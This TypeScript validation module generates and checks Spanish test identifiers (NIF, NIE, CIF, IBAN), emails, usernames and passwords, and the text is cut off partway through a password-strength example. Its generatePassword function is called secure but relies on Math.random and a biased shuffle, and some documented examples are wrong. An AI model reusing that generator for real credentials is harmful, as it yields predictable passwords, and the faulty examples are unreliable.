/**
 * Validation utilities - Generators, validators, and security functions
 * Consolidated from lib/validation/* modules
 */

/* eslint-disable complexity */

import { createHash, randomBytes } from 'crypto'
import validator from 'validator'
import { isNodeEnvironment } from './environment'

// =============================================================================
// RANDOM GENERATORS (from generators.ts)
// =============================================================================

// Native implementations to replace Chance.js
const randomInteger = (min: number, max: number): number => {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

const randomString = (length: number, pool?: string): string => {
  const chars = pool || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  return result
}

const randomAlphaString = (length: number, casing?: 'upper' | 'lower'): string => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
  let result = randomString(length, chars)
  if (casing === 'upper') result = result.toUpperCase()
  if (casing === 'lower') result = result.toLowerCase()
  return result
}

const randomAlphaNumericString = (length: number, casing?: 'upper' | 'lower'): string => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = randomString(length, chars)
  if (casing === 'upper') result = result.toUpperCase()
  if (casing === 'lower') result = result.toLowerCase()
  return result
}

const pickone = <T>(array: T[]): T => {
  return array[Math.floor(Math.random() * array.length)]
}

const randomBool = (likelihood = 50): boolean => {
  return Math.random() * 100 < likelihood
}

// =============================================================================
// GENERATORS - Random data generators
// =============================================================================

/**
 * Generates a random integer within the specified range.
 */
export const generateRandomInteger = (min = 0, max = 100): number => {
  return randomInteger(min, max)
}

/**
 * Generates a random alphabetic string with specified options.
 */
export const generateAlphaString = (
  options: { length?: number; casing?: 'upper' | 'lower' | undefined } = {}
): string => {
  const { length = 10, casing = undefined } = options
  return randomAlphaString(length, casing)
}

/**
 * Generates a random alphanumeric string with specified options.
 */
export const generateAlphaNumericString = (
  options: { length?: number; casing?: 'upper' | 'lower' | undefined } = {}
): string => {
  const { length = 10, casing = undefined } = options
  return randomAlphaNumericString(length, casing)
}

/**
 * Generates a random string with letters, numbers, and symbols.
 */
export const generateComplexString = (
  options: { length?: number; casing?: 'upper' | 'lower' | undefined } = {}
): string => {
  const { length = 10, casing: _casing = undefined } = options
  return randomString(length)
}

/**
 * Generates a unique username from an email address.
 */
export const generateUsernameFromEmail = (email: string, randomDigits = 1): string => {
  if (!email || !email.includes('@'))
    return `user${Math.floor(Math.random() * Math.pow(10, randomDigits))}`

  const localPart = email.split('@')[0]
  const username = localPart
    .toLowerCase()
    .replace(/[^a-z0-9]/g, '') // Solo letras y números
    .substring(0, 12) // Limitar longitud

  const randomSuffix = Math.floor(Math.random() * Math.pow(10, randomDigits))
  return username + randomSuffix
}

/**
 * Generates a unique username with specified configuration.
 */
export const generateUsername = (separator = '', randomDigits = 1, length = 8): string => {
  const adjectives = [
    'cool',
    'happy',
    'smart',
    'fast',
    'nice',
    'wild',
    'free',
    'bold',
    'calm',
    'brave',
  ]
  const nouns = ['cat', 'dog', 'bird', 'fish', 'lion', 'bear', 'wolf', 'tiger', 'eagle', 'shark']

  const adjective = adjectives[Math.floor(Math.random() * adjectives.length)]
  const noun = nouns[Math.floor(Math.random() * nouns.length)]
  const randomSuffix = Math.floor(Math.random() * Math.pow(10, randomDigits))

  const username = adjective + separator + noun + randomSuffix

  return username.length > length ? username.substring(0, length) : username
}

// =============================================================================
// SPANISH GENERATORS - Spanish-specific document generators
// =============================================================================

/**
 * Generates a valid Spanish NIF (Número de Identificación Fiscal) number
 *
 * Creates a syntactically valid NIF for Spanish nationals used for testing and development.
 * The NIF follows the official format: 8 digits + 1 control letter calculated using modulo 23.
 *
 * Format: `NNNNNNNNL` where:
 * - N = Digit (0-9), total 8 digits
 * - L = Control letter from 'TRWAGMYFPDXBNJZSQVHLCKE'
 *
 * Algorithm:
 * 1. Generate random 8-digit number (10000000-99999999)
 * 2. Calculate: `letter = letters[number % 23]`
 * 3. Return: `number + letter`
 *
 * ⚠️ TESTING ONLY:
 * - Generated NIFs are syntactically valid but NOT real documents
 * - **DO NOT** use for fraud, identity theft, or illegal activities
 * - For production identity verification, use official Spanish government APIs
 * - Paired with {@link isValidNIF} for validation testing
 *
 * @returns Valid NIF string in format NNNNNNNNL (e.g., '12345678Z')
 *
 * @example
 * ```typescript
 * // Basic generation
 * const nif = generateSpanishNIF()
 * console.log(nif)  // '45678234T' (8 digits + letter)
 *
 * // Verify it's valid
 * console.log(isValidNIF(nif))  // true
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Test data generation for Spanish user registration
 * function createTestUser() {
 *   return {
 *     name: 'Test User',
 *     nif: generateSpanishNIF(),
 *     email: generateEmail(),
 *     phone: generateSpanishPhone()
 *   }
 * }
 *
 * const testUser = createTestUser()
 * console.log(testUser)
 * // {
 * //   name: 'Test User',
 * //   nif: '87654321X',
 * //   email: 'ana.garcia@gmail.com',
 * //   phone: '+34612345678'
 * // }
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Populate test database with Spanish users
 * async function seedSpanishUsers(count: number) {
 *   const users = Array.from({ length: count }, (_, i) => ({
 *     id: i + 1,
 *     nif: generateSpanishNIF(),
 *     name: `Test User ${i + 1}`,
 *     createdAt: new Date()
 *   }))
 *
 *   await db.users.insertMany(users)
 *   console.log(`✅ Created ${count} test users with valid NIFs`)
 * }
 *
 * await seedSpanishUsers(100)
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Form validation testing
 * describe('Spanish NIF Validation', () => {
 *   test('should accept valid NIFs', () => {
 *     const validNIF = generateSpanishNIF()
 *     expect(isValidNIF(validNIF)).toBe(true)
 *   })
 *
 *   test('should generate unique NIFs', () => {
 *     const nifs = new Set(
 *       Array.from({ length: 1000 }, () => generateSpanishNIF())
 *     )
 *     expect(nifs.size).toBeGreaterThan(990) // ~99% unique
 *   })
 * })
 * ```
 *
 * @example
 * ```typescript
 * // Generate batch for load testing
 * const testNIFs = Array.from({ length: 10000 }, () => generateSpanishNIF())
 * console.log(testNIFs[0])  // '12345678Z'
 * console.log(testNIFs.every(nif => isValidNIF(nif)))  // true
 * ```
 *
 * @see {@link isValidNIF} for NIF validation
 * @see {@link generateSpanishNIE} for NIE generation (foreigners)
 * @see {@link generateSpanishCIF} for CIF generation (companies)
 * @see {@link https://www.boe.es/eli/es/rd/2008/11/21/1065 Spanish NIF Official Regulation}
 */
export const generateSpanishNIF = (): string => {
  const number = randomInteger(10000000, 99999999)
  const letters = 'TRWAGMYFPDXBNJZSQVHLCKE'
  const letter = letters[number % 23]
  return `${number}${letter}`
}

/**
 * Generates a valid Spanish NIE (Número de Identidad de Extranjero)
 *
 * Creates syntactically valid NIE for foreign residents in Spain. Format: `XNNNNNNNL` or `YNNNNNNNL` or `ZNNNNNNNL`
 * where prefix (X/Y/Z) indicates registration period, 7 digits, and control letter from modulo 23 algorithm.
 *
 * @returns Valid NIE string (e.g., 'X1234567L', 'Y9876543R', 'Z5555555K')
 *
 * @example
 * ```typescript
 * const nie = generateSpanishNIE()  // 'Y2345678A'
 * console.log(isValidNIE(nie))  // true
 *
 * // Test data for foreign resident registration
 * const foreignUser = {
 *   nie: generateSpanishNIE(),
 *   nationality: 'British',
 *   residencePermit: 'Permanent'
 * }
 * ```
 *
 * @see {@link isValidNIE} for NIE validation
 * @see {@link generateSpanishNIF} for Spanish nationals
 */
export const generateSpanishNIE = (): string => {
  const prefixes = ['X', 'Y', 'Z']
  const selectedPrefix = pickone(prefixes)
  const prefixValue = selectedPrefix === 'X' ? 0 : selectedPrefix === 'Y' ? 1 : 2
  const number = randomInteger(1000000, 9999999)
  const letters = 'TRWAGMYFPDXBNJZSQVHLCKE'
  const calculationNumber = prefixValue * 10000000 + number
  const letter = letters[calculationNumber % 23]
  return `${selectedPrefix}${number}${letter}`
}

/**
 * Generates a valid Spanish CIF (Código de Identificación Fiscal) for companies
 *
 * Creates syntactically valid CIF for Spanish legal entities. Format: `LNNNNNNNC` where L=organization type letter,
 * 7 digits, C=control digit/letter calculated using weighted sum algorithm.
 *
 * @returns Valid CIF string (e.g., 'A12345678', 'B98765432', 'G55555555')
 *
 * @example
 * ```typescript
 * const cif = generateSpanishCIF()  // 'B12345678'
 * console.log(isValidCIF(cif))  // true
 *
 * // Test data for company registration
 * const company = {
 *   cif: generateSpanishCIF(),
 *   name: 'Test SL',
 *   type: 'Sociedad Limitada'
 * }
 * ```
 *
 * @see {@link isValidCIF} for CIF validation
 * @see {@link generateSpanishNIF} for individuals
 */
export const generateSpanishCIF = (): string => {
  const organizationTypes = [
    'A',
    'B',
    'C',
    'D',
    'E',
    'F',
    'G',
    'H',
    'J',
    'N',
    'P',
    'Q',
    'R',
    'S',
    'U',
    'V',
    'W',
  ]
  const organizationType = pickone(organizationTypes)
  const number = randomInteger(1000000, 9999999).toString().padStart(7, '0')

  // Calculate control digit
  let sum = 0
  for (let i = 0; i < 7; i++) {
    let digit = parseInt(number[i])
    if (i % 2 === 0) {
      digit *= 2
      if (digit > 9) digit = Math.floor(digit / 10) + (digit % 10)
    }
    sum += digit
  }

  const controlDigit = (10 - (sum % 10)) % 10
  const controlLetter = 'JABCDEFGHI'[controlDigit]
  const control = ['N', 'P', 'Q', 'R', 'S', 'W'].includes(organizationType)
    ? controlLetter
    : randomBool()
      ? controlDigit.toString()
      : controlLetter

  return `${organizationType}${number}${control}`
}

/**
 * Generates a valid Spanish postal code (Código Postal)
 *
 * Creates valid 5-digit Spanish postal code with province prefix (01-52) following Spanish postal system.
 *
 * @returns Valid Spanish postal code (e.g., '28001' Madrid, '08001' Barcelona, '41001' Sevilla)
 *
 * @example
 * ```typescript
 * const postalCode = generateSpanishPostalCode()  // '28045'
 * console.log(isValidSpanishPostalCode(postalCode))  // true
 * ```
 *
 * @see {@link isValidSpanishPostalCode} for validation
 */
export const generateSpanishPostalCode = (): string => {
  const validPrefixes = [
    '01',
    '02',
    '03',
    '04',
    '05',
    '06',
    '07',
    '08',
    '09',
    '10',
    '11',
    '12',
    '13',
    '14',
    '15',
    '16',
    '17',
    '18',
    '19',
    '20',
    '21',
    '22',
    '23',
    '24',
    '25',
    '26',
    '27',
    '28',
    '29',
    '30',
    '31',
    '32',
    '33',
    '34',
    '35',
    '36',
    '37',
    '38',
    '39',
    '40',
    '41',
    '42',
    '43',
    '44',
    '45',
    '46',
    '47',
    '48',
    '49',
    '50',
    '51',
    '52',
  ]

  const firstDigit = pickone(validPrefixes)
  const remainingDigits = randomString(3, '0123456789')
  return `${firstDigit}${remainingDigits}`
}

/**
 * Generates a valid Spanish IBAN (International Bank Account Number)
 *
 * Creates syntactically valid Spanish IBAN following ISO 13616 standard. Format: `ESnn bbbb ssss dddd nnnnnnnnnn`
 * where nn=check digits (mod 97), bbbb=bank code, ssss=branch, dd=account control, 10 digits=account number.
 *
 * @returns Valid Spanish IBAN (e.g., 'ES9121000418450200051332')
 *
 * @example
 * ```typescript
 * const iban = generateSpanishIBAN()  // 'ES1234567890123456789012'
 * console.log(isValidSpanishIBAN(iban))  // true
 *
 * // Test banking data
 * const account = {
 *   iban: generateSpanishIBAN(),
 *   owner: 'Test User',
 *   bank: 'Test Bank'
 * }
 * ```
 *
 * @see {@link isValidSpanishIBAN} for IBAN validation
 */
export const generateSpanishIBAN = (): string => {
  const bankCode = randomString(4, '0123456789') // Código banco
  const branchCode = randomString(4, '0123456789') // Código sucursal
  const controlDigits = randomString(2, '0123456789') // DC cuenta
  const accountNumber = randomString(10, '0123456789') // Número cuenta

  // Calculate IBAN check digits
  const accountPart = `${bankCode}${branchCode}${controlDigits}${accountNumber}`
  // Move ES00 to end and replace letters with numbers: E=14, S=28
  const rearranged = `${accountPart}142800`

  // Calculate mod 97
  const checkDigits = String(98n - (BigInt(rearranged) % 97n)).padStart(2, '0')

  return `ES${checkDigits}${bankCode}${branchCode}${controlDigits}${accountNumber}`
}

// =============================================================================
// GENERAL GENERATORS
// =============================================================================

/**
 * Generates a realistic fake email address for testing
 *
 * Creates email with Spanish first/last names and common domains. Format: `firstname.lastname@domain.com`
 * or variations with numbers. Perfect for test data, demos, and mock user generation.
 *
 * @param domain - Optional custom domain (default: random from gmail.com, hotmail.com, yahoo.es, outlook.com, test.com)
 * @returns Fake email address (e.g., 'ana.garcia@gmail.com', 'carlos45@hotmail.com')
 *
 * @example
 * ```typescript
 * const email1 = generateEmail()  // 'maria.lopez@yahoo.es'
 * const email2 = generateEmail('company.com')  // 'jose.martinez@company.com'
 *
 * // Generate test user batch
 * const testUsers = Array.from({ length: 100 }, (_, i) => ({
 *   id: i + 1,
 *   email: generateEmail('testapp.com'),
 *   nif: generateSpanishNIF()
 * }))
 * ```
 *
 * @see {@link isValidEmail} for email validation
 * @see {@link generateUsernameFromEmail} to extract username
 */
export const generateEmail = (domain?: string): string => {
  const firstNames = [
    'Ana',
    'Carlos',
    'María',
    'José',
    'Laura',
    'David',
    'Carmen',
    'Antonio',
    'Isabel',
    'Manuel',
  ]
  const lastNames = [
    'García',
    'González',
    'López',
    'Martínez',
    'Sánchez',
    'Pérez',
    'Gómez',
    'Martín',
    'Jiménez',
    'Ruiz',
  ]
  const domains = ['gmail.com', 'hotmail.com', 'yahoo.es', 'outlook.com', 'test.com']

  const firstName = pickone(firstNames)
  const lastName = pickone(lastNames)
  const emailDomain = domain || pickone(domains)

  const formats = [
    `${firstName.toLowerCase()}.${lastName.toLowerCase()}@${emailDomain}`,
    `${firstName.toLowerCase()}${randomInteger(1, 99)}@${emailDomain}`,
    `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randomInteger(1, 9)}@${emailDomain}`,
    `${firstName.toLowerCase()}${lastName.toLowerCase()}@${emailDomain}`,
  ]

  const username = pickone(formats)
  return username.toLowerCase()
}

/**
 * Generates a random secure password with customizable criteria
 *
 * Creates passwords with configurable character sets (uppercase, lowercase, numbers, symbols).
 * Guarantees at least one character from each enabled category for security requirements.
 *
 * @param options - Password generation options
 * @param options.length - Password length (default: 12, min: 4, max: 30)
 * @param options.includeUppercase - Include A-Z (default: true)
 * @param options.includeLowercase - Include a-z (default: true)
 * @param options.includeNumbers - Include 0-9 (default: true)
 * @param options.includeSymbols - Include !@#$%^&* (default: true)
 * @returns Random password matching criteria (e.g., 'Ab3!xY7$qW2z')
 *
 * @example
 * ```typescript
 * const pwd1 = generatePassword()  // 'Xy9$mK2!pL4@' (all characters)
 * const pwd2 = generatePassword({ length: 16 })  // 'aB3$xY7!mK9@pL2#'
 * const pwd3 = generatePassword({ includeSymbols: false })  // 'Ab3xY7qW2z' (no symbols)
 *
 * // PIN-style password
 * const pin = generatePassword({
 *   length: 6,
 *   includeUppercase: false,
 *   includeLowercase: false,
 *   includeSymbols: false
 * })  // '847293' (numbers only)
 * ```
 *
 * @see {@link validatePassword} for password validation
 * @see {@link hashString} for password hashing (NOT recommended, use bcrypt instead)
 */
export const generatePassword = (
  options: {
    length?: number
    includeUppercase?: boolean
    includeLowercase?: boolean
    includeNumbers?: boolean
    includeSymbols?: boolean
  } = {}
): string => {
  const {
    length = 12,
    includeUppercase = true,
    includeLowercase = true,
    includeNumbers = true,
    includeSymbols = true,
  } = options

  const minLength = 4
  const maxLength = 30
  const targetLength = length || randomInteger(minLength, maxLength)

  const upperChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
  const lowerChars = 'abcdefghijklmnopqrstuvwxyz'
  const numberChars = '0123456789'
  const symbolChars = '!@#$%^&*()_+-=[]{}|;:,.<>?'

  let charset = ''
  let requiredChars = ''

  // Construir charset y caracteres requeridos
  if (includeUppercase) {
    charset += upperChars
    requiredChars += upperChars.charAt(Math.floor(Math.random() * upperChars.length))
  }
  if (includeLowercase) {
    charset += lowerChars
    requiredChars += lowerChars.charAt(Math.floor(Math.random() * lowerChars.length))
  }
  if (includeNumbers) {
    charset += numberChars
    requiredChars += numberChars.charAt(Math.floor(Math.random() * numberChars.length))
  }
  if (includeSymbols) {
    charset += symbolChars
    requiredChars += symbolChars.charAt(Math.floor(Math.random() * symbolChars.length))
  }

  if (!charset) charset = 'abcdefghijklmnopqrstuvwxyz'

  // Generar caracteres restantes
  let password = requiredChars
  const remainingLength = targetLength - requiredChars.length

  for (let i = 0; i < remainingLength; i++) {
    password += charset.charAt(Math.floor(Math.random() * charset.length))
  }

  // Mezclar los caracteres para que los requeridos no estén al principio
  return password
    .split('')
    .sort(() => Math.random() - 0.5)
    .join('')
}

/**
 * Generates a random hex color.
 */
export const generateHexColor = (shortFormat?: boolean): string => {
  const hexChars = '0123456789ABCDEF'
  const useShortFormat = shortFormat !== undefined ? shortFormat : randomBool()

  if (useShortFormat) {
    // Formato corto: #RGB
    const r = pickone(hexChars.split(''))
    const g = pickone(hexChars.split(''))
    const b = pickone(hexChars.split(''))
    return `#${r}${g}${b}`
  } else {
    // Formato largo: #RRGGBB
    const color = randomString(6, hexChars)
    return `#${color}`
  }
}

// =============================================================================
// VALIDATORS (from validators.ts)
// =============================================================================

/**
 * Validates Spanish NIF (Número de Identificación Fiscal) format and check digit
 *
 * Verifies NIF follows format NNNNNNNNL (8 digits + control letter) and validates check digit using mod 23 algorithm.
 * Compatible with generated NIFs from {@link generateSpanishNIF}.
 *
 * @param nif - NIF string to validate (e.g., '12345678Z')
 * @returns true if valid NIF format and check digit, false otherwise
 *
 * @example
 * ```typescript
 * isValidNIF('12345678Z')  // true (valid)
 * isValidNIF('12345678X')  // false (wrong check letter)
 * isValidNIF('1234567Z')   // false (too short)
 *
 * // Form validation
 * if (!isValidNIF(userInput)) {
 *   throw new Error('NIF inválido')
 * }
 * ```
 *
 * @see {@link generateSpanishNIF} for NIF generation
 * @see {@link isValidNIE} for NIE validation (foreigners)
 */
export const isValidNIF = (nif: string): boolean => {
  if (!nif || typeof nif !== 'string') return false

  const cleanNif = nif.trim().toUpperCase()
  const nifRegex = /^[0-9]{8}[TRWAGMYFPDXBNJZSQVHLCKE]$/

  if (!nifRegex.test(cleanNif)) return false

  const number = parseInt(cleanNif.substring(0, 8))
  const letter = cleanNif.charAt(8)
  const letters = 'TRWAGMYFPDXBNJZSQVHLCKE'
  const expectedLetter = letters[number % 23]

  return letter === expectedLetter
}

/**
 * Alias for isValidNIF - validates Spanish NIF format and check digit.
 * @alias isValidNIF
 */
export const validateNIF = isValidNIF

/**
 * Validates Spanish NIE (Número de Identidad de Extranjero) format and check digit
 *
 * Verifies NIE follows format XNNNNNNNL/YNNNNNNNL/ZNNNNNNNL and validates check digit.
 *
 * @param nie - NIE string to validate (e.g., 'X1234567L')
 * @returns true if valid NIE, false otherwise
 *
 * @example
 * ```typescript
 * isValidNIE('X1234567L')  // true
 * isValidNIE('A1234567L')  // false (invalid prefix)
 * ```
 *
 * @see {@link generateSpanishNIE}
 * @see {@link isValidNIF}
 */
export const isValidNIE = (nie: string): boolean => {
  if (!nie || typeof nie !== 'string') return false

  const cleanNie = nie.trim().toUpperCase()
  const nieRegex = /^[XYZ][0-9]{7}[TRWAGMYFPDXBNJZSQVHLCKE]$/

  if (!nieRegex.test(cleanNie)) return false

  const prefix = cleanNie.charAt(0)
  const number = parseInt(cleanNie.substring(1, 8))
  const letter = cleanNie.charAt(8)

  const prefixValue = prefix === 'X' ? 0 : prefix === 'Y' ? 1 : 2
  const calculationNumber = prefixValue * 10000000 + number
  const letters = 'TRWAGMYFPDXBNJZSQVHLCKE'
  const expectedLetter = letters[calculationNumber % 23]

  return letter === expectedLetter
}

/**
 * Validates Spanish CIF (Código de Identificación Fiscal) for companies
 *
 * Verifies CIF follows format LNNNNNNNC and validates weighted sum control digit/letter.
 *
 * @param cif - CIF string to validate (e.g., 'A12345678')
 * @returns true if valid CIF, false otherwise
 *
 * @example
 * ```typescript
 * isValidCIF('A12345678')  // true (if check digit valid)
 * isValidCIF('12345678A')  // false (wrong format)
 * ```
 *
 * @see {@link generateSpanishCIF}
 */
export const isValidCIF = (cif: string): boolean => {
  if (!cif || typeof cif !== 'string') return false

  const cleanCif = cif.trim().toUpperCase()
  const cifRegex = /^[ABCDEFGHJNPQRSUVW][0-9]{7}[0-9A-J]$/

  if (!cifRegex.test(cleanCif)) return false

  const organizationType = cleanCif.charAt(0)
  const number = cleanCif.substring(1, 8)
  const control = cleanCif.charAt(8)

  // Calculate control digit
  let sum = 0
  for (let i = 0; i < 7; i++) {
    let digit = parseInt(number[i])
    if (i % 2 === 0) {
      digit *= 2
      if (digit > 9) digit = Math.floor(digit / 10) + (digit % 10)
    }
    sum += digit
  }

  const controlDigit = (10 - (sum % 10)) % 10
  const controlLetter = 'JABCDEFGHI'[controlDigit]

  // Different organization types use different control formats
  if (['N', 'P', 'Q', 'R', 'S', 'W'].includes(organizationType)) {
    return control === controlLetter
  } else {
    return control === controlDigit.toString() || control === controlLetter
  }
}

/**
 * Validates Spanish postal code format
 *
 * Verifies postal code is 5 digits with valid province prefix (01-52).
 *
 * @param postalCode - Postal code string (e.g., '28001', '08080')
 * @returns true if valid Spanish postal code, false otherwise
 *
 * @example
 * ```typescript
 * isValidSpanishPostalCode('28001')  // true (Madrid)
 * isValidSpanishPostalCode('08080')  // true (Barcelona)
 * isValidSpanishPostalCode('99999')  // false (invalid prefix)
 * ```
 *
 * @see {@link generateSpanishPostalCode}
 */
export const isValidSpanishPostalCode = (postalCode: string): boolean => {
  if (!postalCode || typeof postalCode !== 'string') return false

  const cleanCode = postalCode.trim()
  const postalCodeRegex = /^(0[1-9]|[1-4][0-9]|5[0-2])[0-9]{3}$/

  return postalCodeRegex.test(cleanCode)
}

/**
 * Validates Spanish phone number format
 *
 * Accepts mobile (6XX/7XX) and landline (9XX) with optional +34 country code.
 *
 * @param phone - Phone string (e.g., '612345678', '+34 612 345 678')
 * @returns true if valid Spanish phone, false otherwise
 *
 * @example
 * ```typescript
 * isValidSpanishPhone('612345678')      // true (mobile)
 * isValidSpanishPhone('+34 612345678')  // true (with country code)
 * isValidSpanishPhone('912345678')      // true (landline)
 * isValidSpanishPhone('512345678')      // false (invalid prefix)
 * ```
 *
 * @see {@link generateSpanishPhone}
 */
export const isValidSpanishPhone = (phone: string): boolean => {
  if (!phone || typeof phone !== 'string') return false

  // Remove spaces, dashes, and parentheses
  const cleanPhone = phone.replace(/[\s\-()]/g, '')

  // Spanish mobile: 6XX XXX XXX or 7XX XXX XXX
  // Spanish landline: 9XX XXX XXX
  // With country code: +34 or 0034
  const phoneRegex = /^(?:\+34|0034|34)?([679][0-9]{8})$/

  return phoneRegex.test(cleanPhone)
}

/**
 * Validates email format using comprehensive RFC 5322 standard
 *
 * Uses validator.js library for robust email validation including internationalized domains.
 *
 * @param email - Email string to validate (e.g., 'user@example.com')
 * @returns true if valid email format, false otherwise
 *
 * @example
 * ```typescript
 * isValidEmail('user@example.com')     // true
 * isValidEmail('user.name+tag@domain.co.uk')  // true
 * isValidEmail('invalid@')             // false
 * isValidEmail('no-at-sign.com')       // false
 * ```
 *
 * @see {@link generateEmail}
 */
export const isValidEmail = (email: string): boolean => {
  if (!email || typeof email !== 'string') return false
  return validator.isEmail(email)
}

/**
 * Validates URL format with protocol requirement and localhost support
 *
 * Uses validator.js with protocol requirement, plus special handling for localhost URLs.
 *
 * @param url - URL string to validate (e.g., 'https://example.com')
 * @returns true if valid URL, false otherwise
 *
 * @example
 * ```typescript
 * isValidURL('https://example.com')     // true
 * isValidURL('http://localhost:3000')   // true
 * isValidURL('example.com')             // false (no protocol)
 * isValidURL('ftp://files.example.com') // true
 * ```
 */
export const isValidURL = (url: string): boolean => {
  if (!url || typeof url !== 'string') return false

  // First try with strict validation
  if (validator.isURL(url, { require_protocol: true })) {
    return true
  }

  // Special handling for localhost URLs
  try {
    const urlObj = new URL(url)
    return urlObj.hostname === 'localhost' || urlObj.hostname === '127.0.0.1'
  } catch {
    return false
  }
}

/**
 * Validates if string is a valid JSON.
 */
export const isValidJSON = (str: string): boolean => {
  if (!str || typeof str !== 'string') return false
  try {
    JSON.parse(str)
    return true
  } catch {
    return false
  }
}

/**
 * Validates Spanish IBAN (International Bank Account Number) format and check digits
 *
 * Verifies IBAN follows ES format (ES + 2 check digits + 20 digits) and validates mod 97 check.
 *
 * @param iban - IBAN string to validate (e.g., 'ES9121000418450200051332')
 * @returns true if valid Spanish IBAN, false otherwise
 *
 * @example
 * ```typescript
 * isValidSpanishIBAN('ES9121000418450200051332')  // true
 * isValidSpanishIBAN('ES00 1234 5678 9012 3456 7890')  // true (spaces OK)
 * isValidSpanishIBAN('FR1420041010050500013M02606')  // false (French IBAN)
 * ```
 *
 * @see {@link generateSpanishIBAN}
 */
export const isValidSpanishIBAN = (iban: string): boolean => {
  if (!iban || typeof iban !== 'string') return false

  const cleanIban = iban.replace(/\s/g, '').toUpperCase()

  // Spanish IBAN format: ES + 2 check digits + 20 digits
  const ibanRegex = /^ES[0-9]{22}$/

  if (!ibanRegex.test(cleanIban)) return false

  // IBAN check digit validation (mod 97)
  const rearranged = cleanIban.substring(4) + cleanIban.substring(0, 4)
  const numericString = rearranged.replace(/[A-Z]/g, letter => {
    return (letter.charCodeAt(0) - 55).toString()
  })

  // Calculate mod 97 for large numbers
  let remainder = 0
  for (let i = 0; i < numericString.length; i++) {
    remainder = (remainder * 10 + parseInt(numericString[i])) % 97
  }

  return remainder === 1
}

// =============================================================================
// SECURITY (from security.ts)
// =============================================================================

/**
 * Password criteria interface
 */
export interface PasswordCriteria {
  minLength?: number
  requireUppercase?: boolean
  requireLowercase?: boolean
  requireNumbers?: boolean
  requireSpecialChars?: boolean
  maxLength?: number
  forbiddenPatterns?: string[]
}

/**
 * Password validation result interface
 */
export interface PasswordValidationResult {
  isValid: boolean
  errors: string[]
  strength: 'weak' | 'fair' | 'good' | 'strong'
  score: number // 0-100
}

/**
 * Validates password strength against customizable security criteria
 *
 * Comprehensive password validation with strength scoring (0-100) and detailed error messages.
 * Checks multiple security factors: length, character diversity, forbidden patterns, common sequences.
 *
 * Validation Criteria:
 * - **Length**: min/max character count (default: 8-128)
 * - **Uppercase**: At least one A-Z letter
 * - **Lowercase**: At least one a-z letter
 * - **Numbers**: At least one digit 0-9
 * - **Special chars**: At least one symbol (!@#$%^&* etc.)
 * - **Forbidden patterns**: Blacklisted strings (usernames, company names, etc.)
 * - **Common sequences**: Penalizes '123', 'abc', 'qwerty'
 * - **Repeated characters**: Penalizes 'aaa', '111'
 *
 * Strength Scoring:
 * - **weak** (0-29): Missing multiple criteria or very short
 * - **fair** (30-59): Meets basic requirements but lacks complexity
 * - **good** (60-79): Strong password with good diversity
 * - **strong** (80-100): Excellent password with high entropy
 *
 * ⚠️ SECURITY NOTES:
 * - This is client-side validation - always verify server-side too
 * - Consider implementing rate limiting for password attempts
 * - Use bcrypt/argon2 for password hashing (not included)
 * - Check against common password databases (HaveIBeenPwned API)
 * - Enforce password expiration policies for high-security contexts
 *
 * @param password - Password string to validate
 * @param criteria - Validation criteria (optional, uses secure defaults)
 * @param criteria.minLength - Minimum length (default: 8)
 * @param criteria.maxLength - Maximum length (default: 128)
 * @param criteria.requireUppercase - Require A-Z (default: true)
 * @param criteria.requireLowercase - Require a-z (default: true)
 * @param criteria.requireNumbers - Require 0-9 (default: true)
 * @param criteria.requireSpecialChars - Require symbols (default: true)
 * @param criteria.forbiddenPatterns - Blacklisted strings (e.g., usernames)
 * @returns PasswordValidationResult with isValid, errors[], strength, and score
 *
 * @example
 * ```typescript
 * // Basic validation - Default criteria
 * const result = validatePassword('MyP@ssw0rd')
 * console.log(result)
 * // {
 * //   isValid: true,
 * //   errors: [],
 * //   strength: 'good',
 * //   score: 75
 * // }
 *
 * // Weak password
 * const weak = validatePassword('password')
 * console.log(weak)
 * // {
 * //   isValid: false,
 * //   errors: [
 * //     'La contraseña debe contener al menos una letra mayúscula',
 * //     'La contraseña debe contener al menos un número',
 * //     'La contraseña debe contener al menos un caracter especial'
 * //   ],
 * //   strength: 'weak',
 * //   score: 5  // Penalized for 'abc' sequence
 * // }
 * ```
 *
 * @example
 * ```typescript
 * // Custom criteria - Relaxed requirements
 * const result = validatePassword('Secure123', {
 *   minLength: 8,
 *   requireUppercase: true,
 *   requireLowercase: true,
 *   requireNumbers: true,
 *   requireSpecialChars: false  // Not required
 * })
 * console.log(result)
 * // { isValid: true, errors: [], strength: 'fair', score: 50 }
 * ```
 *
 * @example
 * ```typescript
 * // Forbidden patterns - Prevent personal info
 * const result = validatePassword('Alice123!@#', {
 *   forbiddenPatterns: ['alice', 'bob', 'company']
 * })
 * console.log(result.errors)
 * // ['La contraseña no puede contener: alice']
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Registration form validation
 * function validateRegistration(username: string, password: string) {
 *   const validation = validatePassword(password, {
 *     minLength: 12,  // Stricter minimum
 *     forbiddenPatterns: [
 *       username.toLowerCase(),
 *       'password',
 *       'company',
 *       'admin'
 *     ]
 *   })
 *
 *   if (!validation.isValid) {
 *     throw new Error(`Password invalid: ${validation.errors.join(', ')}`)
 *   }
 *
 *   if (validation.strength === 'weak') {
 *     console.warn('⚠️ Password is weak, consider using a stronger one')
 *   }
 *
 *   return validation
 * }
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Password strength meter UI
 * function updatePasswordStrengthUI(password: string) {
 *   const result = validatePassword(password)
 *
 *   // Update progress bar
 *   document.getElementById('strength-bar').style.width = `${result.score}%`
 *
 *   // Update color based on strength
 *   const colors = {
 *     weak: '#f44336',    // Red
 *     fair: '#ff9800',    // Orange
 *     good: '#4caf50',    // Green
 *     strong: '#2196f3'   // Blue
 *   }
 *   document.getElementById('strength-bar').style.backgroundColor = colors[result.strength]
 *
 *   // Display errors
 *   const errorList = result.errors.map(err => `<li>${err}</li>`).join('')
